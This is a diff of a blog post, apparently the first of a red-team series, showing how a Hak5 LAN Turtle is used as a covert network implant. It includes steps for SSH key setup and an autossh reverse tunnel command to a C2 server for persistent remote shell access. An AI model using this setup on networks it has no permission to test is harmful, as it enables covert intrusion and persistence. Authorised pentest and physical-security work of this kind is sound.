@@ -1,14 +1,13 @@
 ---
 title: "Plug & Pwn Chronicles - LAN Turtle"
-date: 2025-01-20T09:00:00+02:00
+date: 2025-05-08T09:00:00+02:00
 draft: false
 author: "Anthony Tuff"
 cover:
-image: /img/manager.png   ins
 # alt: 'This is an alt tag for You Are Here picture'
 # caption: 'This is a caption for the image. You are not lost.'
-tags: ["maanger-hackthebox","windows","hackthebox-walktrough","htb","tech"]
-categories: ["hackthebox","windows","boot2root","tech"]
+tags: ["Hack 5 -","LAN Turtle","intial access","Red Teaming","tech"]
+categories: ["Remote Access wiith LAN Turtle","LAN Turtle for Remote Access","boot2root","tech"]
 ---
 So, I recently got my hands on a few Hak5 toys , major shoutout to zerofrost and Wanjohi . After spending some time tinkering with them, testing, and a bit of troubleshooting , I figured, why not document the madness?
 This will be start of a mini-series where I’ll be showing how these gadgets can fit right into Red Team ops and Physical Security reviews. Expect some playlists, walkthroughs, real-world use cases, and my own experience hacking away. 
@@ -17,7 +16,7 @@ This will be start of a mini-series where I’ll be showing how these gadgets ca
 At first glance, it looks like your average Ethernet-to-USB adapter. Boring, right? But nope, it’s a ninja in disguise. Under the hood, it’s a full-blown Linux box built to blend into office setups while giving you covert access to internal networks.
 ![](/img/Turtle/Pasted%20image%2020250508003229.png)
 Basically, it’s like having a stealthy *"backdoor in a dongle"*  that fits in your pocket. Perfect for those post-compromise ops or sneaky internal recon during Red Team gigs. You plug it in, and boom, you’re in the network, doing your thing like a digital ghost. With it we can be able to perform a number of things such as 
- remote shell access, tunneling traffic, exfiltrating data, or runs automated scripts once plugged into a target environment.
+ remote shell access, tunneling traffic, exfiltrating data, or running automated scripts once plugged into a target environment.
 
 ### Real-World Analogies and Use Cases
 Let's pick this scenario, Lets say you're inside a client’s premises during a physical assessment, or mid-way through an internal engagement- Blackbox phase. You stumble upon wall-mounted RJ45 Ethernet ports, unused printer connections, unattended Switch or Routers,  VoIP phone ports, unlocked data centers, or exposed docking stations under desks. These are all opportunities for silent compromise. Now am wishing I had these before for some Nasty Red Team Engagements I've been in.
@@ -48,11 +47,12 @@ Fire up PuTTY (or use your terminal if you're on Linux/macOS), and SSH into the 
 Once inside, you'll see the Turtle Shell, a simple ncurses-style interface where you can configure modules, install new payloads, and manage your backdoor.
 ![](/img/Turtle/Pasted%20image%2020250506102112.png)
 ![](/img/Turtle/Pasted%20image%2020250506102139.png)
+![](/img/Turtle/Pasted%20image%2020250506205422.png)
 Once it’s connected, the Turtle typically sits at `172.16.84.1`, and it runs an SSH server by default.
 
 
 ##### **4.  Set Up SSH Keys (Using KeyManager Module)**
-Before we can configure AutoSSH, we need to set up SSH key-based authentication between the Turtle and our remote C2 server. This is a better approach than using passwords, especially for persistent access
+Before we can configure AutoSSH, we need to set up SSH key-based authentication between the Turtle and our remote C2 server,for this we can use the module key manager module . This is a better approach than using passwords, especially for persistent access
 - Generate a new SSH key pair (recommended if you don’t already have one on the Turtle)
 - Upload an existing private/public key using SSH-Copy ID-> copy_key
 - See below steps
@@ -96,7 +96,8 @@ autossh -M 0 -N -R 4444:localhost:22 fintaXxjXXX@136.XX.X(C2 IP,VPS IP)
 and -M 0 disables monitoring output.
 ```
 ![](/img/Turtle/Pasted%20image%2020250508195249.png)
-To allow LAN Turtle to communicate with our C2 server we first need to configure SSH keys so for this we can use the module key manager module 
+
+
 ##### 6 .**Configuring the VPS Server -Allow SSH Port Forwarding**
  Now we’ve got our LAN Turtle ready to reach out, but unless our VPS (C2 server) is configured to accept and forward those connections, the tunnel won’t connect. In this step we will set up our  VPS to behave like a friendly gatekeeper that says, “Sure, tunnel through me, make yourself at home.
  The LAN Turtle initiates an outbound SSH connection to our C2 server, going t through firewalls like any regular web traffic would. This creates a tunnel that allows us to reverse into it from the VPS.
